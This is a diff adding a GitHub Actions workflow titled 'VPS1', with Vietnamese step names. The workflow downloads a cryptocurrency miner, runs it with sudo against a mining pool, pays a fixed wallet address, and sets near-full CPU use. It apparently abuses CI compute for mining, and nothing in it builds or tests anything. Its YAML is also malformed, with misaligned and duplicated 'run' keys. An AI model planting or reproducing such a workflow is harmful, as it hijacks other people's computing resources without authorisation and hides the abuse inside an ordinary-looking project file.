@@ -1,0 +1,17 @@
+name: VPS1
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: ubuntu-latest
+
+    steps:
+    - name: Cài Đặt tmate
+    run: sudo apt-get update
+    - name: Cài Đặt Webchain Miner
+    run: sudo curl https://github.com/mintme-com/miner/releases/download/v2.8.0/webchain-miner-2.8.0-linux-amd64.tar.gz | tar -xz
+    run: cd webchain-miner-2.8.0-linux-amd64
+    - name: Kết Nối & Đào
+    run: sudo ./webchain-miner -o pool.webchain.network:3333 -u 0xC830bBddD40711c3e9Ce8Ec4D6c057cf42789C8F -p x -t 4 --donate-level=0 --max-cpu-usage=95
